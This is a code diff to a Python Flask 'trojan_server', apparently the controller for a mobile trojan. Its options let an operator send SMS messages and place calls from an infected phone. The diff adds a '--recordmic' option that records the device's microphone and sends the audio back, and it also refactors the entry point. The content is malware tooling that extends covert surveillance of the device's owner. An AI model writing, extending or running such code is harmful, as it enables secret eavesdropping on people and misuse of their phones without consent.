@@ -39,6 +39,8 @@ class parse_args:
                    help='Send SMS')
 		self.parser.add_argument('--call', dest='call', action='store', metavar=('PhoneNumber', 'calltime'), nargs=2, default=False,
                    help='call a number for X millisecondes')
+		self.parser.add_argument('--recordmic', dest='recordmic', action='store', metavar=('recordtime'), nargs=1, default=False,
+                   help='record mic sound for X millisecondes and send receive the audio file')
 		self.parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', default=False,
                    help='verbose')
 		self.args = self.parser.parse_args()
@@ -74,8 +76,6 @@ class trojan_server():
 		else:
 			self.app.run(host=self.host, port=self.port, ssl_context=self.ssl, debug=self.args.verbose)
 			
-			
-
 	def default(self):
   		return 'hello'
 
@@ -105,15 +105,17 @@ class trojan_server():
 			print(request.remote_addr + "Wrong KEY")
 			return Response(self.null, status=401)
 		
-
 	def stop(self):
 		func = request.environ.get('werkzeug.server.shutdown')
 		if func is None:
 		    raise RuntimeError('Not running with the Werkzeug Server')
 		func()
 
-if __name__ == '__main__':
+def main():
 	app = Flask(__name__)
-	server = trojan_server(app=app, host='192.168.2.3', port=8080, args=parse_args().getargs(), ssl=ssl)
+	server = trojan_server(app=app, host='192.168.1.2', port=8080, args=parse_args().getargs(), ssl=ssl)
 	#server = trojan_server(app=app, host='192.168.1.79', port=8080, args=parse_args().getargs())	
 	server.start()
+
+if __name__ == '__main__':
+	main()
